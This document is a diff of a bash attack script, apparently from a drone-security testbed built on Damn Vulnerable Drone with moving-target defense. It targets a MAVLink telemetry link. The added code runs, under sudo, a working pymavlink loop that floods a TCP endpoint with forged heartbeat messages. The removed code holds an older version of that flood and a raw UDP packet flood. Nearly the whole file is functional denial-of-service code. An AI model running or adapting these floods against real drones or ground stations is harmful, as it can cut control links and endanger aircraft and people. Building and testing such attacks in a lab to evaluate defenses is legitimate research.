@@ -1,132 +1,107 @@
 #!/usr/bin/env bash
+set -euo pipefail
 
-# --- Process Command Line Arguments ---
-# Example: Assign first arg to INTENSITY, default 'medium'
-# INTENSITY="${1:-medium}"
-# Example: Assign second arg to DURATION_SECONDS, default '30'
-# DURATION_SECONDS="${2:-30}"
-# echo "Parameters: Intensity=$INTENSITY, Duration=$DURATION_SECONDS"
-# Add more parameter processing as needed for the specific script
-# ------------------------------------
+# Attack: Communication Link Flooding (MAVLink TCP Flood, MTD-aware)
+# Target Service: DRONE_MAVLINK_TCP (Default Port 5760)
 
-# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Communication-Link-Flooding.md
-# Created: 2025-09-14 13:46:03
-# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
-
-# MTD_INTERFACE_START
-# =======================================================================
-# MTD-aware Target Acquisition (from Orchestrator Environment)
-# =======================================================================
-# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
-# 설정될 것을 기대하고 실행됩니다.
-
+# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
+# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
 if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
     echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
-    echo "This script must be run via the attack_orchestrator.py" >&2
+    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
     exit 1
 fi
 
-echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
-# MTD_INTERFACE_END
+# 서비스 타입별 기본 포트 설정 (MAVLink TCP 플러딩을 기본으로 가정)
+case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
+    DRONE_MAVLINK_TCP)
+        TARGET_PORT="${TARGET_PORT:-5760}"
+        ;;
+    DRONE_MAVLINK)
+        TARGET_PORT="${TARGET_PORT:-14550}"
+        ;;
+    *)
+        # Orchestrator가 포트 값을 넣어준다고 가정
+        :
+        ;;
+esac
 
-set -euo pipefail
+echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-UNKNOWN})"
+# --- MTD_INTERFACE_END ---
 
-# 기준 경로 (요구사항)
+# --- Common Log/BASE Setup ---
 export BASE="${BASE:-$PWD}"
-
-# 공통 로그 연결(선택사항) - 존재 시 로드
-if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
-  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
-  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
+if [[ -f "$BASE/00_env.sh" ]]; then
+    . "$BASE/00_env.sh"
+else
+    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
+    mkdir -p "$(dirname "$DVD_LOG")"
+    log(){ echo "[$(date +%F_%T)] $*"; }
+    export -f log
 fi
 
 log "[ATTACK] id=communication-link-flooding src=Communication-Link-Flooding.md"
-log "[BLOCK 1] type=python"
-python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
-# --- argv glue for converter ---
-import os, sys, re
-if len(sys.argv) <= 1:
-    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
-    if ep.startswith('udp:'):
-        try:
-            _, rest = ep.split(':', 1)
-            ep = rest
-        except ValueError:
-            pass
-    # expect ip:port
-    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
-        sys.argv = [sys.argv[0], ep]
-# flood_mavlink_link.py
+log "[BLOCK 1] type=python (MAVLink Heartbeat Flood)"
 
-from pymavlink import mavutil
-import time
+# python3 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
+# '-u' 옵션을 사용하여 버퍼링 없이 실시간 출력을 보장합니다.
+sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
+import os
 import sys
+import time
+from pymavlink import mavutil
 
-def flood_mavlink(target_ip, target_port, rate_hz):
+# 인수 없으면 환경변수 TARGET_IP:TARGET_PORT 사용 (Fallback/Debug)
+if len(sys.argv) <= 1:
+    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
+    target_port = os.environ.get('TARGET_PORT', '5760')
+    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]
+
+target_ip, target_port_str = sys.argv[1].split(':', 1)
+try:
+    target_port = int(target_port_str)
+except ValueError:
+    print(f"[ERROR] Invalid port: {target_port_str}")
+    sys.exit(1)
+
+def flood_mavlink(target_ip, target_port, rate_hz=100.0):
+    # TCP를 사용하여 MAVLink 연결
+    sock = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
+    sock.wait_heartbeat()
+    
+    print(f"[INFO] Connected. Starting MAVLink heartbeat flood to {target_ip}:{target_port} at {rate_hz} messages/sec...")
+
     mav = mavutil.mavlink.MAVLink(None)
     mav.srcSystem = 1
     mav.srcComponent = 1
-
-    sock = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-    sock.wait_heartbeat()
-    print(f"Connected. Starting flood at {rate_hz} messages/sec...")
-
-    interval = 1 / rate_hz
+    
+    interval = 1.0 / rate_hz
+    
+    # 플러딩용 HEARTBEAT 메시지 생성
+    msg = mav.heartbeat_encode(
+        type=mavutil.mavlink.MAV_TYPE_GENERIC,
+        autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
+        base_mode=0,
+        custom_mode=0,
+        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+    )
+    
+    # 플러딩 루프
     while True:
-        msg = mav.heartbeat_encode(
-            type=mavutil.mavlink.MAV_TYPE_GENERIC,
-            autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
-            base_mode=0,
-            custom_mode=0,
-            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
-        )
-        sock.mav.send(msg)
-        print("[+] Flooding heartbeat")
-        time.sleep(interval)
-
-if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python flood_mavlink_link.py <ip:port> <rate_hz>")
-        sys.exit(1)
-
-    ip, port = sys.argv[1].split(":")
-    flood_mavlink(ip, int(port), float(sys.argv[2]))
-PY
-
-log "[BLOCK 2] type=python"
-python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
-# --- argv glue for converter ---
-import os, sys, re
-if len(sys.argv) <= 1:
-    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
-    if ep.startswith('udp:'):
         try:
-            _, rest = ep.split(':', 1)
-            ep = rest
-        except ValueError:
-            pass
-    # expect ip:port
-    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
-        sys.argv = [sys.argv[0], ep]
-# udp_raw_flood.py
-
-import socket
-import time
-import sys
-
-def flood_udp(ip, port, size=1024, interval=0.001):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = b"A" * size
-
-    print(f"Flooding {ip}:{port} with {size}-byte packets every {interval}s...")
-    while True:
-        sock.sendto(payload, (ip, port))
-        time.sleep(interval)
+            sock.mav.send(msg)
+            time.sleep(interval)
+        except Exception as e:
+            # 연결이 끊어졌을 경우 종료 (MTD 이동으로 인한 연결 끊김 등)
+            print(f"[ERROR] Disconnected or sending failed: {e}")
+            break
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python udp_raw_flood.py <ip> <port>")
-        sys.exit(1)
-
-    flood_udp(sys.argv[1], int(sys.argv[2]))
+    # 인수가 <ip:port>만 있도록 수정되었으므로, rate_hz는 내부에서 기본값 사용
+    flood_mavlink(target_ip, target_port)
+    
 PY
+
+log "[BLOCK 2] type=control (In-Foreground Execution)"
+# 공격은 Python 인라인 블록에서 포그라운드로 실행됩니다.
+# attack_orchestrator.py는 SIGTERM 또는 timeout을 통해 이 프로세스를 종료해야 합니다.
